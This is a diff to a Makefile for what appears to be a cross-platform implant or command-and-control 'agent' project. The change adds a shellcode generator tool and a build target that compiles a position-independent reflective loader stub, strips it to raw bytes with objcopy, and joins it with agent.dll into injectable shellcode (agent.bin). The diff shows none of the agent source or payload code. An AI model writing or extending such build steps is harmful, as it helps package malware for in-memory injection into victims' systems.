@@ -79,6 +79,10 @@ endif
 
 .PHONY: exe dll shellcode service_exe linux-elf macos-macho all clean
 
+# ── Host tool for PIC shellcode generation ──
+gen_shellcode: gen_shellcode.c
+	$(CC) -O2 -o gen_shellcode gen_shellcode.c
+
 # ── Windows targets ──
 exe:
 	$(WIN_CC) $(WIN_CFLAGS) -o agent.exe main.c $(WIN_LDFLAGS)
@@ -86,8 +90,14 @@ exe:
 dll:
 	$(WIN_CC) $(WIN_CFLAGS) -shared -DBUILD_DLL -o agent.dll main.c $(WIN_LDFLAGS)
 
-shellcode: exe
-	cp agent.exe agent.bin
+# True PIC shellcode: reflective loader stub + DLL
+shellcode: gen_shellcode dll
+	$(WIN_CC) -Os -nostdlib -nostartfiles -fno-stack-protector \
+		-fno-exceptions -fno-asynchronous-unwind-tables -fno-ident \
+		-Wl,--no-seh,--entry,_start -o pic_stub.exe pic_loader.c
+	x86_64-w64-mingw32-objcopy -O binary -j .text pic_stub.exe pic_stub.bin
+	./gen_shellcode pic_stub.bin agent.dll agent.bin
+	@echo "[+] PIC shellcode generated: agent.bin"
 
 service_exe: exe
 
@@ -102,4 +112,5 @@ macos-macho:
 all: exe linux-elf
 
 clean:
-	rm -f agent.exe agent.dll agent.bin agent_linux agent_macos agent_shellcode.o
+	rm -f agent.exe agent.dll agent.bin agent_linux agent_macos agent_shellcode.o \
+	      gen_shellcode pic_stub.exe pic_stub.bin
